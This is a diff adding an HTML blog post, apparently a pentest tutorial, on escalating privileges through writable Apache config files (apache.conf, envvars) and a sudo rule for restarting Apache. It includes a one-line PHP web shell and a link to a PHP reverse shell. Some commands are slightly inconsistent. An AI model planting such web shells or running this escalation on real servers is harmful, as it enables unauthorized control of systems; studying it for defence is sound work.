@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Abusing  Apache Misconfiguration - Privilege Escalation | Kiwiyumi</title>
+  <link rel="stylesheet" href="https://main--test-kiwi.netlify.appassets/css/post.css" />
+  <script defer src="https://main--test-kiwi.netlify.appassets/js/lbox.js"></script>
+  
+  <link rel="stylesheet" href="https://main--test-kiwi.netlify.appassets/css/common.css" />
+  </head>
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="https://main--test-kiwi.netlify.app">Kiwiyumi</a>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Abusing  Apache Misconfiguration - Privilege Escalation</h2>
+          <small class="date">Fri May 31, 2024</small>
+          <div class="tags">
+            
+            <a href="https://main--test-kiwi.netlify.apptags/privesc" class="tag">privesc</a>
+            
+            <a href="https://main--test-kiwi.netlify.apptags/apache" class="tag">apache</a>
+            
+            <a href="https://main--test-kiwi.netlify.apptags/Web-server" class="tag">Web-server</a>
+            
+          </div>
+        </div>
+        <div class="content"><p>In this article, we&rsquo;re going to talk about a technique for escalating privileges, where the initial vector comes from the misconfiguration of the widely known server, Apache!</p>
+<h1 id="a-little-introduction-to-apache">A little introduction to Apache</h1>
+<p>It all started in 1995, when the Apache HTTP server project was created with the aim of creating and maintaining an open source HTTP server for modern operating systems, mainly UNIX and Windows. Maintaining efficiency, security and synchronization with current HTTP protocol standards.</p>
+<blockquote>
+<p>&ldquo;The Number One HTTP Server On The Internet&rdquo; - Apache Official Website.</p>
+</blockquote>
+<h1 id="overview">Overview</h1>
+<p>When installing the Apache server on your machine, ubuntu for example, you can locate the configuration files in <strong>/etc/apache2</strong>. The following images show an example of the files and directories created:</p>
+<p><img src="/assets/images/abusing-apache-misconfiguration-privilege-escalation/6bf835ee-e63a-4d03-b465-4e358df6730f.png" alt="Config files!"></p>
+<h1 id="how-to-check-this-vulnerability">How to check this vulnerability</h1>
+<p>If you have permissions to restart the apache server, either because of a misconfiguration or because you can run as root. The following code exemplifies a <strong>sudo -l</strong> for a user:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">User www-data may run the following commands on machine:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/service apache2 restart
+</code></pre></div><p>The vulnerability in question is due to improper permission to write from <strong>apache.conf</strong> or <strong>envvars</strong>, as these files define which user will run apache.</p>
+<p>The following image shows an incorrectly configured <strong>apache.conf</strong> file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -la /etc/apache2/apache.conf
+</code></pre></div><p><img src="/assets/images/abusing-apache-misconfiguration-privilege-escalation/a74938bb-f1a0-40a5-bc2b-c2016f2c51ea.png" alt=""></p>
+<p>The following image shows an incorrectly configured <strong>envvars</strong> file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -la /etc/apache2/envvars
+</code></pre></div><p><img src="/assets/images/abusing-apache-misconfiguration-privilege-escalation/fb671cd9-31a5-47bf-bc13-c822054296af.png" alt=""></p>
+<h1 id="exploit---the-best-part">Exploit - The best part</h1>
+<h3 id="1---change-the-files">1 - Change the files</h3>
+<p>Depending on your operating scenario, you&rsquo;ll need to make changes in different ways, so below you can see some of the ways you can change users.</p>
+<p>In the <strong>apache.conf</strong> file, change the following user and group lines to the existing users on your machine, in the example user john:</p>
+<p><img src="/assets/images/abusing-apache-misconfiguration-privilege-escalation/c55311ad-6e8a-40d3-995a-6f1a544d7408.png" alt=""></p>
+<p>In the <strong>envvars</strong> file, change the following variables for existing users on your machine, in the example user john:</p>
+<p><img src="/assets/images/abusing-apache-misconfiguration-privilege-escalation/aa10e0d4-f4a8-4662-ba7d-f6a68fd8d9e3.png" alt=""></p>
+<h3 id="2---create-a-maliciuos-file">2 - Create a maliciuos file</h3>
+<p>As an example, I created the following PHP code in the <strong>/var/www/html</strong> directory, called <strong>file.php</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>You can certainly create a file with a web shell or use a revese shell, like the one in <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">pentest monkey</a>.</p>
+<h3 id="3---restart-the-apache-server">3 - Restart the Apache Server</h3>
+<p>Before you finish, simply restart the Apache server to update the settings we have installed.</p>
+<pre><code>sudo /usr/bin/service restart apache2
+</code></pre><h3 id="4---go-pwned">4 - Go pwned</h3>
+<p>Access your file and happy ending:</p>
+<p><img src="/assets/images/abusing-apache-misconfiguration-privilege-escalation/aa10e0d4-f4a8-4662-ba7d-f6a68fd8d9e3.png" alt=""></p>
+<h1 id="fonts">Fonts</h1>
+<ul>
+<li>Apache HTTP Server Project. (2024, May 31). Apache Software Foundation. <a href="http://httpd.apache.org/">http://httpd.apache.org/</a></li>
+<li>Apache configuration privilege escalation. (2024, May 31). Exploit Notes. <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/apache-conf-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/apache-conf-privilege-escalation/</a></li>
+</ul></div>
+      </section>
+      <footer>
+  <p>&copy; 2023 - 2024 </p>
+</footer>
+    </main>
+  </body>
+</html>
